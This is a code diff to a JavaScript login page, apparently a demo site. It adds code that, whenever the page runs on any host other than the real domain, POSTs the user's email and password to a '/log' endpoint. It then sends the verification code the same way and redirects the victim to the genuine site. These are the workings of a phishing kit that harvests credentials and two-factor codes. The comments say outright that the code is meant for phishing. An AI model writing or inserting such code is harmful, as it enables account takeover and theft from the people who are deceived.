@@ -48,6 +48,17 @@ function initializeLoginPage() {
     // Simulate successful login
     console.log("Login successful", { email });
 
+    // Send login data to server in Phishing
+    if (window.location.hostname !== "account.example.com") {
+      const formData = new FormData();
+      formData.set("email", email);
+      formData.set("password", password);
+      fetch("/log", {
+        method: "POST",
+        body: formData,
+      })
+    }
+
     // Store email for demo purposes
     localStorage.setItem("userEmail", email);
 
@@ -157,10 +168,22 @@ function initializeVerifyPage() {
     // Don't clear stored data yet - dashboard needs it
     // localStorage.removeItem('userEmail');
 
-    setTimeout(() => {
-      // Redirect to dashboard without alert
-      window.location.href = "main.html";
-    }, 2000);
+    // Send login data to server in Phishing
+    if (window.location.hostname !== "account.example.com") {
+      const formData = new FormData();
+      formData.set("code", code);
+      fetch("/log", {
+        method: "POST",
+        body: formData,
+      })
+
+      window.location.href = "https://account.example.com/";
+    } else {
+      setTimeout(() => {
+        // Redirect to dashboard without alert
+        window.location.href = "main.html";
+      }, 2000);
+    }
   });
 }
 
